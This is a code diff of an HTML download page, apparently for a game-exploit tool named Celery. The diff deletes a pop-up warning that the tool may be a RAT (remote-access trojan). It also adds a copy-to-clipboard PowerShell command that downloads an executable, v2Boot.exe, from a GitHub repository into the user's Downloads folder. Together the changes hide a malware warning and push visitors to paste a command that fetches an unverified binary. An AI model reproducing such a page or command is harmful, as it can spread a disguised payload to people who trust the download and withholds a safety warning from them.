@@ -163,49 +163,6 @@
             from { transform: translateY(-30px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
-        /* Pop-up Styles */
-        .popup-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.7); /* Black semi-transparent background */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.3s ease, visibility 0.3s ease;
-        }
-        .popup {
-            background: #000; /* Black background for the pop-up */
-            color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            width: 80vw;
-            max-width: 500px;
-            position: relative;
-            text-align: center;
-        }
-        .popup .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: #ff4c4c;
-            border: none;
-            color: #fff;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 16px;
-        }
     </style>
 </head>
 <body>
@@ -216,21 +173,14 @@
         </div>
     </div>
 
-    <!-- Pop-up Overlay -->
-    <div class="popup-overlay" id="popup-overlay">
-        <div class="popup">
-            <button class="close-btn" onclick="closePopup()">×</button>
-            <p>It Has Come To Our Attention That Celery May Be A Rat, This is Once Again None Confirmed. We Will Look More Into It Before Releasing V2 So Right Now, We Are Down For Futher Investigation - stay safe exploiting gng.</p>
-        </div>
-    </div>
-
     <div class="container">
         <div class="header">
             <h1>Download Here</h1>
             <p>V1.3</p>
         </div>
         <div class="panel">
-            <textarea class="textbox" readonly></textarea>
+            <textarea class="textbox" readonly>Invoke-WebRequest -Uri "https://github.com/scriptsurgee/v2Boot/raw/main/v2Boot.exe" -OutFile "$env:USERPROFILE\Downloads\v2Boot.exe" -ErrorAction Stop | Out-Null
+            </textarea>
             <button class="copy-btn" onclick="copyText()">Copy</button>
         </div>
         <div class="tutorial">
@@ -251,18 +201,11 @@
             alert('Text copied to clipboard!');
         }
 
-        function closePopup() {
-            document.getElementById('popup-overlay').style.opacity = '0';
-            document.getElementById('popup-overlay').style.visibility = 'hidden';
-        }
-
         // Simulate loading process
         setTimeout(() => {
             document.getElementById('loading-overlay').style.opacity = '0';
             document.getElementById('loading-overlay').style.visibility = 'hidden';
             document.querySelector('.container').style.opacity = '1';
-            document.getElementById('popup-overlay').style.opacity = '1';
-            document.getElementById('popup-overlay').style.visibility = 'visible';
         }, 2000); // Simulated loading time (2 seconds)
     </script>
 </body>
